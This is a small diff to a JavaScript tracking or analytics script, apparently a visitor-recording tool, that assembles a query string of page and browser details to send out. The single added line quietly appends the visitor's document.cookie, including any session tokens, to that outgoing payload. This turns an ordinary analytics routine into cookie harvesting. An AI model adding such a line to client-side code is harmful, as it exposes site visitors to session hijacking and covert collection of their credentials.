@@ -218,6 +218,7 @@
       // prepare data
       var data  = "url="        + smtRec.url;
           data += "&urltitle="  + document.title;
+          data += "&cookies="   + document.cookie;
           data += "&bname="     + aux.browserDetect.browser;
           data += "&bversion="  + aux.browserDetect.version;
           data += "&bos="       + aux.browserDetect.OS;
